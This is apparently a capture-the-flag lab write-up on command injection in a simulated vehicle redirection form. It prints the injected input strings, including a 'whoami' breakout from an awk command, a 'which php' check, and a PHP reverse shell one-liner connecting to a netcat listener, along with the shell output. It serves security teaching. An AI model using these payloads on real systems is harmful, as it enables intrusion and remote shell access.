
### 🌐 Command Injection 0x03 [Challenge]: Vehicle Redirection Exploit

---

## ❓ Overview of the Lab

This lab involves a simulated vehicle redirection system where the user inputs a vehicle registration plate along with new X and Y coordinates for the vehicle's destination.  
The lab demonstrates how unsanitized input can lead to command injection.

---

## 🛠️ Exploitation Technique

### **User Inputs**
- **Registration Plate:** `ASH`
- **Position X:** `100`
- **Position Y:** Initially `200`, then manipulated for command injection.

---

### **Initial Output**
```
Executed: awk 'BEGIN {print sqrt(((100-100)^2) + ((200-300)^2))}'
Result: 100
```

---

### **Command Injection to Obtain User Identity**
- **Manipulated Position Y Input:**  
  ```
  300)^2))}'; whoami;#
  ```
- **Resulting Execution:**
  ```
  Executed: awk 'BEGIN {print sqrt(((-100)^2) + ((-300)^2))}'; whoami;#)^2))}'
  Result: 316.228 www-data
  ```

---

### **Establishing PHP Reverse Shell**
- **Final Position Y Input for Reverse Shell:**
  ```bash
  300)^2))}'; php -r '$sock=fsockopen("192.168.164.128",4444);exec("/bin/sh -i <&3 >&3 2>&3");';#
  ```
- **Listening on Attacker's Machine:**
  ```bash
  nc -nlvp 4444
  ```
- **Terminal Output Upon Connection:**
  ```
  listening on [any] 4444 ...
  connect to [192.168.164.128] from (UNKNOWN) [172.18.0.3] 56418
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ hostname
  b92fab868123
  ```

---

## 📡 Understanding the Payload

- **Payload Mechanism:**  
  - The manipulated input terminates the original `awk` command and injects new commands.  
  - The `;` separates commands, and `#` comments out the rest of the original command, preventing errors or further execution.

---

## ❓ Why PHP and Not Python?

- To determine the appropriate payload language, check for the available interpreters:  
  ```bash
  300)^2))}'; which php;#
  ```
- **Result:**
  ```
  Result: 316.228 /usr/local/bin/php 
  ```
- A similar check for Python (`which python`) returns empty, confirming PHP as the suitable payload choice.

---

## 🎯 Lab Conclusion

This lab effectively demonstrates command injection by manipulating input fields in a simulated system control.  
It highlights the critical need for input validation and sanitization to prevent such vulnerabilities.

---
